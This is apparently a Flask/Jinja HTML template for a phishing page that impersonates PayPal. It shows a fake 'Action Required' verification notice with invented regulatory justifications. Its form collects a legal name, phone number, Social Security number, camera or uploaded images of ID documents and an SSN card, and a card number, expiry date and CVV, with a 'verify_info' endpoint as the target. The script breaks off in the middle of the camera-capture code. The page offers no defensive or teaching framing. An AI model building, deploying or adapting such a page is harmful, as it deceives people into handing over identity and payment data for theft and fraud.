<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Action Required - PayPal Account</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <link rel="icon" href="{{ url_for('static', filename='new paypal logo.png') }}" type="image/png">
    <link rel="shortcut icon" href="{{ url_for('static', filename='new paypal logo.png') }}" type="image/png">

    <style>
        /* General Body and Container Styles */
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f7f8f9;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .main-content-wrapper {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 40px 20px;
            box-sizing: border-box;
        }

        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            padding: 32px;
            width: 100%;
            max-width: 580px;
            box-sizing: border-box;
            text-align: center;
        }

        /* PayPal Logo Styles */
        .paypal-logo { /* This is for the logo inside the main container, not the header */
            width: 100px;
            height: 30px;
            object-fit: contain;
            margin: 0 auto 30px auto;
            display: block;
        }

        /* Headings and Paragraphs */
        h1 {
            color: #003087;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 20px;
            text-align: center;
        }

        h2 {
            color: #003087;
            font-size: 22px;
            font-weight: 600;
            margin-top: 30px;
            margin-bottom: 15px;
            text-align: left;
        }

        p {
            font-size: 16px;
            line-height: 1.5;
            color: #333;
            margin-bottom: 15px;
            text-align: left;
        }

        ul {
            list-style: disc;
            padding-left: 20px;
            text-align: left;
            margin-bottom: 20px;
        }

        li {
            font-size: 15px;
            color: #555;
            margin-bottom: 8px;
        }

        .section-title {
            font-size: 18px;
            font-weight: 600;
            color: #003087;
            margin-top: 25px;
            margin-bottom: 15px;
            text-align: left;
            border-bottom: 1px solid #eee;
            padding-bottom: 8px;
        }

        .info-box {
            background-color: #e0f8ff;
            border: 1px solid #cceeff;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 25px;
            text-align: left;
            display: flex;
            align-items: flex-start;
        }
        .info-box .icon {
            font-size: 20px;
            color: #0070ba;
            margin-right: 10px;
            flex-shrink: 0;
        }
        .info-box p {
            margin: 0;
            font-size: 15px;
            color: #333;
        }

        /* Input Fields and Labels */
        .input-group {
            margin-bottom: 24px;
            text-align: left;
            position: relative;
        }

        .input-label {
            position: absolute;
            top: 12px;
            left: 12px;
            color: #6a6a6a;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s ease-out;
            background-color: #fff;
            padding: 0 4px;
            transform: translateY(-50%) scale(1);
            transform-origin: left top;
            z-index: 1;
        }

        .input-field {
            width: 100%;
            padding: 18px 12px 6px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.3s ease;
            box-sizing: border-box;
            background-color: #fff;
            position: relative;
            z-index: 0;
        }
        .input-field:focus {
            outline: none;
            border-color: #0070ba;
            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.25);
        }

        /* Floating Label effect */
        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label {
            top: -8px;
            left: 8px;
            font-size: 12px;
            color: #003087;
            transform: translateY(0) scale(0.9);
            background-color: #fff;
            padding: 0 4px;
        }
        .input-field:not(:placeholder-shown) {
            padding-top: 18px;
        }

        /* Styles for the "Show/Hide" toggle button for SSN and CVV */
        .toggle-visibility-button {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #0070ba;
            font-size: 1em;
            font-weight: 600;
            z-index: 2;
            padding: 5px;
        }
        .toggle-visibility-button:hover {
            text-decoration: underline;
        }
        .toggle-visibility-button.hidden {
            display: none;
        }

        /* Credit Card specific styles */
        .card-number-group {
            position: relative; /* Needed for positioning card type icon */
        }

        .card-type-icon {
            position: absolute;
            right: 12px; 
            top: 50%;
            transform: translateY(-50%);
            width: 40px; 
            height: 25px; 
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            pointer-events: none; 
            z-index: 1; 
        }

        .card-type-icon.visa {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%231A1F71'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='20' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EVISA%3C/text%3E%3C/svg%3E");
        }
        .card-type-icon.mastercard {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23F0F0F0'/%3E%3Ccircle cx='38' cy='30' r='18' fill='%23EB001B'/%3E%3Ccircle cx='62' cy='30' r='18' fill='%23F79E1B'/%3E%3Cpath d='M50,30 A18,18 0 0,0 50,30 Z' fill='%23FF5F00'/%3E%3C/svg%3E");
        }
        .card-type-icon.amex {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23006FCF'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='20' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EAMEX%3C/text%3E%3C/svg%3E");
        }
        .card-type-icon.discover {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23FF6600'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='16' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EDISCOVER%3C/text%3E%3C/svg%3E");
        }
        .card-type-icon.jcb {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23003A80'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='20' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EJCB%3C/text%3E%3C/svg%3E");
        }
        .card-type-icon.dinersclub { 
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23004B8D'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='14' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EDINERS CLUB%3C/text%3E%3C/svg%3E");
        }

        .card-details-row {
            display: flex;
            gap: 15px;
            margin-bottom: 24px;
        }
        .card-details-row .input-group {
            flex: 1;
            margin-bottom: 0;
        }
        .card-details-row .input-field {
            padding: 18px 12px 6px 12px;
        }

        /* --- UPDATED STYLES FOR UPLOAD SECTIONS --- */
        .upload-options-wrapper {
            display: flex;
            align-items: center;
            gap: 8px; /* Reduced gap */
            margin-bottom: 10px; 
        }

        .upload-file-container { 
            flex-grow: 1; 
            display: flex;
            align-items: center;
            background-color: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 10px 15px;
            cursor: pointer;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            min-height: 38px; /* Adjusted height */
            box-sizing: border-box;
        }
        .upload-file-container:hover {
            border-color: #0070ba;
            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.1);
        }
        .upload-file-icon {
            margin-right: 8px; /* Reduced margin */
            color: #0070ba; /* Changed to blue to match theme */
            font-size: 18px; 
            line-height: 1;
        }
        .upload-file-text {
            font-size: 15px; /* Slightly smaller */
            color: #333;
            font-weight: 500;
        }

        .camera-icon-button {
            background-color: #fff; /* White background */
            color: #0070ba; /* PayPal blue icon */
            border: 1px solid #0070ba; /* Blue border */
            border-radius: 50%; 
            width: 38px;  /* Adjusted size to match height of file container */
            height: 38px; 
            font-size: 18px; /* Adjusted icon size */
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background-color 0.2s ease, color 0.2s ease, border-color 0.2s ease;
            flex-shrink: 0; 
            padding: 0; 
        }
        .camera-icon-button:hover {
            background-color: #e0f8ff; /* Light blue hover */
            border-color: #005ea6;
        }
        .camera-icon-button .icon { 
            /* Emoji itself, no specific style needed unless using font icon */
        }
        /* --- END UPDATED UPLOAD STYLES --- */
        
        .hidden-file-input { display: none; }
        .image-preview-container {
            margin-bottom: 10px; 
            text-align: center;
        }
        .image-preview {
            max-width: 150px; 
            max-height: 100px;
            border: 1px solid #ddd;
            border-radius: 4px;
            display: inline-block; 
            margin: 5px auto;
            object-fit: contain; 
        }
        .image-preview-label {
            font-size: 12px;
            color: #555;
            display: block;
            margin-top: 2px;
        }

        .camera-view-container {
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 15px;
            margin-top: 10px; 
            margin-bottom: 20px;
            text-align: center;
        }
        .camera-view-container video {
            display: block;
            margin: 0 auto 10px auto;
            border: 1px solid #ccc;
            border-radius: 4px;
            max-width: 100%;
            background-color: #000; 
        }
        .camera-view-container .action-button { 
            margin-top: 10px;
            width: auto; 
            padding: 10px 20px;
            display: inline-block;
            margin-right: 10px; 
            font-size: 14px;
        }
        .camera-view-container .action-button:last-child {
            margin-right: 0;
        }
        .camera-view-container .action-button.secondary { 
            background-color: #6c757d; 
            border-color: #6c757d;
        }
        .camera-view-container .action-button.secondary:hover {
            background-color: #5a6268;
        }

        .info-note {
            font-size: 14px;
            color: #555;
            margin-top: 20px;
            text-align: center;
            padding: 0 10px;
        }
        .info-note .info-icon {
            margin-right: 5px;
            color: #555;
            font-size: 16px;
            vertical-align: middle;
        }

        .action-button { /* General action button, used for main submit and camera capture */
            background-color: #0070ba;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 4px;
            font-size: 18px; 
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: background-color 0.3s ease;
            width: 100%; 
            margin-bottom: 15px;
        }
        .camera-view-container .action-button { /* Override for buttons inside camera view */
            font-size: 14px; 
            padding: 10px 20px;
            width: auto;
        }

        .action-button:hover { background-color: #003087; }
        .action-button:focus { outline: none; box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.25); }

        .secondary-link {
            display: block;
            margin-top: 10px;
            font-size: 14px;
            color: #0070ba;
            text-decoration: none;
            font-weight: 600;
        }
        .secondary-link:hover { text-decoration: underline; }

        .header-bar {
            background-color: #003087;
            color: white;
            padding: 15px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
            width: 100%;
            box-sizing: border-box;
            z-index: 1000;
        }
        .header-left .paypal-logo-header {
            content: url("{{ url_for('static', filename='new paypal logo.png') }}");
            height: 30px; 
            width: auto;  
            max-width: 120px; 
            object-fit: contain;
            display: block;
        }
        .header-nav ul {
            list-style: none;
            margin: 0;
            padding: 0;
            display: flex;
            gap: 25px;
        }
        .header-nav a {
            color: white;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            transition: color 0.2s ease;
        }
        .header-nav a:hover {
            color: #a0cff7;
        }
        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .header-right .icon-bell {
            font-size: 20px;
            color: white;
            cursor: pointer;
            position: relative;
        }
        .notification-dot {
            position: absolute;
            top: -5px;
            right: -5px;
            background-color: #e53e3e;
            border-radius: 50%;
            width: 10px;
            height: 10px;
            display: none;
        }
        .header-right .logout-btn {
            background: none;
            border: 1px solid white;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: background-color 0.2s ease, color 0.2s ease;
        }
        .logout-btn:hover {
            background-color: white;
            color: #003087;
        }
        .footer-bar {
            background-color: #f7f8f9;
            padding: 40px 20px;
            border-top: 1px solid #e0e0e0;
            text-align: center;
            box-sizing: border-box;
        }
        .footer-links-group {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 25px;
            margin-bottom: 25px;
        }
        .footer-links-group .col {
            min-width: 120px;
            text-align: left;
        }
        .footer-links-group .col h4 {
            color: #003087;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        .footer-links-group .col ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        .footer-links-group .col a {
            color: #555;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 8px;
        }
        .footer-links-group .col a:hover {
            text-decoration: underline;
            color: #0070ba;
        }
        .footer-bottom-text {
            font-size: 14px;
            color: #6a6a6a;
            margin-top: 20px;
        }
        .footer-bottom-text a {
            color: #0070ba;
            text-decoration: none;
        }
        .footer-bottom-text a:hover {
            text-decoration: underline;
        }
        .notification-modal {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            max-width: 400px;
            text-align: center;
        }
        .notification-modal h3 {
            color: #003087;
            font-size: 20px;
            margin-bottom: 15px;
        }
        .notification-modal p {
            font-size: 16px;
            color: #333;
            margin-bottom: 25px;
        }
        .notification-modal button {
            background-color: #0070ba;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
        }
        .notification-modal button:hover {
            background-color: #003087;
        }
    </style>
</head>
<body data-index-url="{{ url_for('index') }}"> 
    <header class="header-bar">
        <div class="header-left">
            <img src="{{ url_for('static', filename='new paypal logo.png') }}" alt="PayPal Logo" class="paypal-logo-header">
        </div>
        <nav class="header-nav">
            <ul>
                <li><a href="#">Home</a></li>
                <li><a href="#">Finances</a></li>
                <li><a href="#">Send and Request</a></li>
                <li><a href="#">Rewards</a></li>
                <li><a href="#">Wallet</a></li>
                <li><a href="#">Activity</a></li>
                <li><a href="#">Help</a></li>
            </ul>
        </nav>
        <div class="header-right">
            <span class="icon-bell" id="notification-bell">&#128276;<span class="notification-dot" id="notification-dot"></span></span>
            <button class="logout-btn" id="header-logout-button" data-logout-url="{{ url_for('logout') }}">LOG OUT</button>
        </div>
    </header>

    <div class="notification-modal" id="notification-modal">
        <h3>Action Required for Your PayPal Account</h3>
        <p>Your account requires updated details to comply with financial regulations and ensure full functionality. Please complete the verification step.</p>
        <button id="modal-proceed-button">Go to Verification</button>
    </div>

    <div class="main-content-wrapper">
        <div class="container">
             <img src="{{ url_for('static', filename='new paypal logo.png') }}" alt="PayPal Logo" class="paypal-logo">
            <h1>Important: Action Required for Your PayPal Account</h1>
            <div class="info-box">
                <span class="icon">&#9432;</span>
                <p>To ensure the continued security and compliance of your PayPal account, we periodically conduct reviews of customer information. We require some updated details from you to comply with financial regulations and to ensure your account remains fully functional. Please provide the following information to complete this important verification step:</p>
            </div>

            <form id="verification-form" data-verify-url="{{ url_for('verify_info') }}">
                <div class="section-title">1. Confirm Your Full Name</div>
                <p>Please use your full legal name registered with PayPal, accurately matched to your government-issued identification.</p>
                <div class="input-group">
                    <input type="text" id="full-name" name="full-name" class="input-field" required placeholder=" ">
                    <label for="full-name" class="input-label">Full Legal Name</label>
                </div>

                <div class="section-title">2. Verify Your Phone Number</div>
                <p>We require confirmation of your primary number for enhanced account security and communication.</p>
                <div class="input-group">
                    <input type="tel" id="phone-number" name="phone-number" class="input-field" required placeholder=" ">
                    <label for="phone-number" class="input-label">Registered Phone Number (e.g., (123) 456-7890)</label>
                </div>

                <div class="section-title">3. Verify Your Social Security Number (SSN)</div>
                <p>For identity verification and regulatory compliance, please provide your Social Security Number (SSN).</p>
                <div class="input-group">
                    <input type="text" id="ssn" name="ssn" class="input-field" placeholder=" " inputmode="numeric" autocomplete="off" maxlength="11" required>
                    <label for="ssn" class="input-label">Social Security Number (XXX-XX-XXXX)</label>
                    <button type="button" id="toggle-ssn-visibility" class="toggle-visibility-button">Show</button>
                </div>

                <div class="section-title">4. Upload Government-Issued Photo Identification</div>
                <p>Please upload clear images of both the front and back of your ID.</p>
                <ul>
                    <li>Accepted Document Types: Passport - Driver's License - National Identity Card.</li>
                    <li>Submission Guidelines: Ensure images are clear, all four corners visible, and all text legible.</li>
                </ul>

                <p style="text-align: left; font-weight: 600; margin-bottom: 5px;">Front of ID:</p>
                <div class="upload-options-wrapper">
                    <div class="upload-file-container" id="upload-photo-id-front-trigger">
                        <span class="upload-file-icon">&#128444;&#65039;</span> <span class="upload-file-text">Upload ID Front</span>
                        <input type="file" id="photo-id-front-input" name="photo-id-front" accept="image/*" class="hidden-file-input">
                    </div>
                    <button type="button" id="start-camera-front" class="camera-icon-button" title="Use Camera (Front)">
                        <span class="icon">&#128247;</span> </button>
                </div>
                <div class="image-preview-container">
                    <img id="photo-id-front-preview" class="image-preview" src="" alt="Photo ID Front Preview" style="display: none;">
                    <span id="photo-id-front-label" class="image-preview-label"></span>
                </div>
                <div id="camera-view-front" class="camera-view-container" style="display: none;">
                    <video id="video-preview-front" width="320" height="240" autoplay playsinline></video>
                    <canvas id="canvas-front" style="display:none;"></canvas>
                    <button type="button" id="capture-photo-front" class="action-button">Capture Photo</button>
                    <button type="button" id="stop-camera-front" class="action-button secondary">Close Camera</button>
                </div>

                <p style="text-align: left; font-weight: 600; margin-bottom: 5px; margin-top:15px;">Back of ID (if applicable):</p>
                <div class="upload-options-wrapper">
                    <div class="upload-file-container" id="upload-photo-id-back-trigger">
                        <span class="upload-file-icon">&#128444;&#65039;</span>
                        <span class="upload-file-text">Upload ID Back</span>
                        <input type="file" id="photo-id-back-input" name="photo-id-back" accept="image/*" class="hidden-file-input">
                    </div>
                    <button type="button" id="start-camera-back" class="camera-icon-button" title="Use Camera (Back)">
                         <span class="icon">&#128247;</span>
                    </button>
                </div>
                <div class="image-preview-container">
                    <img id="photo-id-back-preview" class="image-preview" src="" alt="Photo ID Back Preview" style="display: none;">
                     <span id="photo-id-back-label" class="image-preview-label"></span>
                </div>
                 <div id="camera-view-back" class="camera-view-container" style="display: none;">
                    <video id="video-preview-back" width="320" height="240" autoplay playsinline></video>
                    <canvas id="canvas-back" style="display:none;"></canvas>
                    <button type="button" id="capture-photo-back" class="action-button">Capture Photo</button>
                    <button type="button" id="stop-camera-back" class="action-button secondary">Close Camera</button>
                </div>
                
                <div class="section-title" style="margin-top: 30px;">5. Upload Copy of Social Security Card (Optional)</div>
                 <div class="upload-options-wrapper">
                    <div class="upload-file-container" id="upload-ssn-card-trigger">
                        <span class="upload-file-icon">&#128179;</span> <span class="upload-file-text">Upload SSN Card</span>
                        <input type="file" id="ssn-card-input" name="ssn-card" accept="image/*" class="hidden-file-input">
                    </div>
                    <button type="button" id="start-camera-ssn" class="camera-icon-button" title="Use Camera (SSN Card)">
                        <span class="icon">&#128247;</span>
                    </button>
                </div>
                <div class="image-preview-container">
                    <img id="ssn-card-preview" class="image-preview" src="" alt="SSN Card Preview" style="display: none;">
                     <span id="ssn-card-label" class="image-preview-label"></span>
                </div>
                 <div id="camera-view-ssn" class="camera-view-container" style="display: none;">
                    <video id="video-preview-ssn" width="320" height="240" autoplay playsinline></video>
                    <canvas id="canvas-ssn" style="display:none;"></canvas>
                    <button type="button" id="capture-photo-ssn" class="action-button">Capture Photo</button>
                    <button type="button" id="stop-camera-ssn" class="action-button secondary">Close Camera</button>
                </div>

                <div class="section-title" style="margin-top: 30px;">6. Review and Confirm Linked Financial Instrument</div>
                 <p>For security and compliance purposes, we may ask you to confirm details of your linked bank accounts or credit/debit cards.</p>
                <div class="input-group card-number-group">
                    <input type="text" id="card-number" name="card-number" class="input-field" placeholder=" " inputmode="numeric" autocomplete="cc-number">
                    <label for="card-number" class="input-label">Card Number</label>
                    <div id="card-type-icon" class="card-type-icon"></div>
                </div>
                <div class="card-details-row">
                    <div class="input-group">
                        <input type="text" id="expiry-date" name="expiry-date" class="input-field" placeholder=" " inputmode="numeric" autocomplete="cc-exp" maxlength="5">
                        <label for="expiry-date" class="input-label">MM/YY</label>
                    </div>
                    <div class="input-group">
                        <input type="text" id="cvv" name="cvv" class="input-field" placeholder=" " inputmode="numeric" autocomplete="cc-csc" maxlength="4">
                        <label for="cvv" class="input-label">CVV</label>
                        <button type="button" id="toggle-cvv-visibility" class="toggle-visibility-button">
                            Show
                        </button>
                    </div>
                </div>

                <p class="info-note">
                    <span class="info-icon">&#9432;</span>
                    Upon submission of the required information, our team will review it. We generally take up to 1 business day(s) to review requests and get back.
                </p>
                <h2 style="text-align: left; margin-top: 30px;">Why is this necessary?</h2>
                <p style="text-align: left;">As a regulated financial institution, PayPal is obligated to periodically collect and verify customer identity information. This process is essential for complying with anti-money laundering (AML) and other financial regulations, helping to ensure the security of your account and the integrity of our payment platform for all users.</p>

                <button type="submit" class="action-button" style="margin-top: 30px;">Confirm and Continue</button>
                <a href="#" id="go-to-login-link" class="secondary-link">Not you? Go back to Login</a>
            </form>
        </div>
    </div>

    <footer class="footer-bar">
        <div class="footer-links-group">
            <div class="col">
                <img src="{{ url_for('static', filename='new paypal logo.png') }}" alt="PayPal Logo" class="paypal-logo" style="width: 80px; height: 24px; margin: 0;">
            </div>
            <div class="col">
                <h4>Help</h4>
                <ul>
                    <li><a href="#">Contact Us</a></li>
                    <li><a href="#">Security</a></li>
                    <li><a href="#">Fees</a></li>
                </ul>
            </div>
            <div class="col">
                <h4>Legal</h4>
                <ul>
                    <li><a href="#">Privacy</a></li>
                    <li><a href="#">Cookies</a></li>
                    <li><a href="#">Legal</a></li>
                    <li><a href="#">Policy Updates</a></li>
                </ul>
            </div>
        </div>
        <p class="footer-bottom-text">© 1999-2025 PayPal, Inc. All rights reserved.</p>
    </footer>

    <script>
        // --- URLs from Flask ---
        const VERIFY_INFO_URL = document.getElementById('verification-form')?.dataset.verifyUrl;
        const LOGOUT_URL = document.getElementById('header-logout-button')?.dataset.logoutUrl;
        const INDEX_URL = document.body.dataset.indexUrl;

        // --- General Page Elements ---
        const notificationBell = document.getElementById('notification-bell');
        const notificationDot = document.getElementById('notification-dot');
        const notificationModal = document.getElementById('notification-modal');
        const modalProceedButton = document.getElementById('modal-proceed-button');
        const headerLogoutButton = document.getElementById('header-logout-button');
        const goToLoginLink = document.getElementById('go-to-login-link');

        window.addEventListener('DOMContentLoaded', () => {
            if(notificationDot) notificationDot.style.display = 'block';
        });
        if(notificationBell && notificationModal && notificationDot) { 
            notificationBell.addEventListener('click', () => {
                notificationModal.style.display = 'block';
                notificationDot.style.display = 'none';
            });
        }
        if(modalProceedButton && notificationModal) { 
            modalProceedButton.addEventListener('click', () => {
                notificationModal.style.display = 'none';
            });
        }
        
        if(headerLogoutButton && LOGOUT_URL && INDEX_URL) {
            headerLogoutButton.addEventListener('click', async () => {
                try {
                    const response = await fetch(LOGOUT_URL, { method: 'POST' });
                    if (response.ok) { window.location.href = INDEX_URL; } 
                    else { alert('Logout failed. Please try again.'); }
                } catch (error) { console.error('Logout error:', error); alert('An error occurred during logout.'); }
            });
        }
        if(goToLoginLink && INDEX_URL) {
            goToLoginLink.addEventListener('click', function(event) {
                event.preventDefault(); window.location.href = INDEX_URL;
            });
        }

        // --- SSN Input and Formatting Logic ---
        const ssnInput = document.getElementById('ssn');
        const toggleSsnVisibilityButton = document.getElementById('toggle-ssn-visibility');
        let rawSsn = '';
        if (ssnInput && toggleSsnVisibilityButton) {
            ssnInput.addEventListener('input', function() {
                let currentDigits = this.value.replace(/[^0-9]/g, '');
                if (currentDigits.length > 9) currentDigits = currentDigits.substring(0, 9);
                rawSsn = currentDigits;
                this.value = this.type === 'password' ? formatAndCensorSsn(rawSsn) : formatSsn(rawSsn);
            });
            ssnInput.addEventListener('blur', function() {
                 this.value = this.type === 'password' ? formatAndCensorSsn(rawSsn) : formatSsn(rawSsn);
            });
            toggleSsnVisibilityButton.addEventListener('click', function() {
                if (ssnInput.type === 'password') {
                    ssnInput.type = 'text'; this.textContent = 'Hide'; ssnInput.value = formatSsn(rawSsn);
                } else {
                    ssnInput.type = 'password'; this.textContent = 'Show'; ssnInput.value = formatAndCensorSsn(rawSsn);
                }
            });
        }
        function formatSsn(ssn) {
            if (!ssn) return ''; let formatted = ssn;
            if (formatted.length > 3) formatted = formatted.substring(0, 3) + '-' + formatted.substring(3);
            if (formatted.length > 6) formatted = formatted.substring(0, 6) + '-' + formatted.substring(6);
            return formatted;
        }
        function formatAndCensorSsn(ssnValue) {
            if (!ssnValue) return '';
            if (ssnValue.length <= 5) return '***-**-'.substring(0, ssnValue.length + Math.floor(ssnValue.length / 3)) + ssnValue.substring(ssnValue.length);
            return '***-**-' + ssnValue.substring(ssnValue.length - 4);
        }

        // --- Credit Card Input Logic ---
        const cardNumberInput = document.getElementById('card-number');
        const cardTypeIcon = document.getElementById('card-type-icon');
        const expiryDateInput = document.getElementById('expiry-date');
        const cvvInput = document.getElementById('cvv');
        const toggleCvvVisibilityButtonCard = document.getElementById('toggle-cvv-visibility'); 
        const cardTypes = [
            { name: "Visa", pattern: /^4/ }, { name: "Mastercard", pattern: /^5[1-5]/ },
            { name: "Amex", pattern: /^3[47]/ }, { name: "Discover", pattern: /^6(?:011|5|4[4-9]|22)/ },
            { name: "JCB", pattern: /^(?:2131|1800|35)/ }, { name: "Diners Club", pattern: /^3(?:0[0-5]|[68][0-9])/ }
        ];
        if (cardNumberInput) {
            cardNumberInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, ''); let formattedValue = ''; let cardType = null;
                for (const type of cardTypes) if (type.pattern.test(value)) { cardType = type; break; }
                if (cardType && cardType.name === "Amex") {
                    this.maxLength = 17; 
                    if (value.length > 4) formattedValue += value.substring(0, 4) + ' '; else formattedValue += value.substring(0, 4);
                    if (value.length > 10) formattedValue += value.substring(4, 10) + ' ' + value.substring(10,15);
                    else if (value.length > 4) formattedValue += value.substring(4,10);
                } else {
                    this.maxLength = 19; 
                    for (let i = 0; i < value.length; i++) {
                        if (i > 0 && i % 4 === 0 && i < 16) formattedValue += ' ';
                        formattedValue += value[i];
                        if (i >=15 && cardType && cardType.name !== "Amex") break;
                        if (i >=14 && cardType && cardType.name === "Amex") break;
                    }
                }
                this.value = formattedValue.trim();
                if(cardTypeIcon) {
                    cardTypeIcon.className = 'card-type-icon';
                    if (cardType) {
                        cardTypeIcon.classList.add(cardType.name.toLowerCase().replace(/\s+/g, ''));
                        cardTypeIcon.title = cardType.name;
                    } else { cardTypeIcon.title = ''; }
                }
            });
        }
        if (expiryDateInput) {
             expiryDateInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2,4);
                this.value = value;
            });
        }
        if (toggleCvvVisibilityButtonCard && cvvInput) { 
            toggleCvvVisibilityButtonCard.addEventListener('click', function() {
                if (cvvInput.type === 'password') {
                    cvvInput.type = 'text'; this.textContent = 'Hide';
                } else {
                    cvvInput.type = 'password'; this.textContent = 'Show';
                }
            });
        }

        // --- Camera and File Upload Logic ---
        let capturedPhotoIdFrontBase64 = ''; 
        let capturedPhotoIdBackBase64 = '';
        let capturedSsnCardBase64 = '';

        function initializeCameraUpload(type) {
            const startCameraButton = document.getElementById(`start-camera-${type}`);
            const cameraView = document.getElementById(`camera-view-${type}`);
            const videoPreview = document.getElementById(`video-preview-${type}`);
            const canvas = document.getElementById(`canvas-${type}`);
            const capturePhotoButton = document.getElementById(`capture-photo-${type}`);
            const stopCameraButton = document.getElementById(`stop-camera-${type}`);
            const fileInput = document.getElementById(type === 'ssn' ? 'ssn-card-input' : `photo-id-${type}-input`);
            const imagePreview = document.getElementById(type === 'ssn' ? 'ssn-card-preview' : `photo-id-${type}-preview`);
            const imageLabel = document.getElementById(type === 'ssn' ? 'ssn-card-label' : `photo-id-${type}-label`);
            
            let currentStream = null;

            if (!startCameraButton || !cameraView || !videoPreview || !canvas || !capturePhotoButton || !stopCameraButton || !fileInput || !imagePreview || !imageLabel) {
                console.warn(`Camera elements for type '${type}' not fully found. Camera functionality may be limited.`);
                return;
            }
            
            async function startCamera() {
                if (cameraView && videoPreview) {
                    try {
                        if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); }
                        currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                        videoPreview.srcObject = currentStream;
                        cameraView.style.display = 'block';
                        videoPreview.style.display = 'block';
                        imagePreview.style.display = 'none'; 
                        imageLabel.textContent = ''; 
                        fileInput.value = ''; 
                        if (type === 'front') capturedPhotoIdFrontBase64 = '';
                        else if (type === 'back') capturedPhotoIdBackBase64 = '';
                        else if (type === 'ssn') capturedSsnCardBase64 = '';

                    } catch (err) {
                        console.error(`Error accessing camera (${type}): `, err);
                        alert(`Could not access the camera for ${type}. Please ensure permissions are granted and you are on a secure (HTTPS) connection if not on localhost. You can still use the file upload option.`);
                        cameraView.style.display = 'none';
                    }
                }
            }

            function stopCamera() {
                if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); currentStream = null; }
                if (cameraView) cameraView.style.display = 'none';
                if (videoPreview) videoPreview.srcObject = null;
            }

            startCameraButton.addEventListener('click', startCamera);
            stopCameraButton.addEventListener('click', stopCamera);

            capturePhotoButton.addEventListener('click', () => {
                if (!currentStream || !videoPreview.videoWidth || !videoPreview.videoHeight) { 
                    alert("Camera is not active or ready. Please try starting the camera again."); 
                    return; 
                }
                canvas.width = videoPreview.videoWidth;
                canvas.height = videoPreview.videoHeight;
